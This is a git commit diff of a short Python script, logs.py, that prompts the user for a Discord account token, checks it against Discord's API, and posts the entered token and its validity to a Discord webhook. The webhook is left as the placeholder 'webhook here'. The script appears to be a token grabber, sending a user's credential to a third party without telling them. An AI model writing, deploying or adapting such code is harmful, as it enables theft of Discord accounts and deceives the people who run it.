05dfcaf0e674064bc38e4ed11a7eec87b0b45927
2vq <74454528+2vq@users.noreply.github.com>
2022-01-21 18:39:59 -0500

    Update logs.py

--- logs.py
+++ logs.py
@@ -1,22 +1,21 @@
-# ass code slaps :thumbsup:
-
 import requests
 import discord
 from dhooks import Webhook
 
 token = input(f'Discord Token -> ')
+client = discord.Client()
 
 link = f'https://discord.com/api/v9/users/@me'
 headers = {'Authorization': f'{token}'}
 codes = [200, 201, 204]
-api = f'webbhook link here'
+api = f'webhook here'
 
 def checktoken():
     r = requests.get(link, headers = headers)
     if r.status_code in codes:
         return 'Valid Token | User Token'
     else:
-        return 'Invalid Token | Fake Token/Bot Token'
+        return 'Invalid Token'
 tokentype = checktoken()
 if tokentype == 'Valid Token | User Token':
     valid = f'True'
@@ -25,7 +24,6 @@ elif tokentype == 'Invalid Token':
 def log():
     webhook = Webhook(api)
     webhook.send(f'''```yaml
-[!] -> File Ran.
 Token Type: {tokentype}
 Token Entered: {token}
 Valid: {valid}```''')
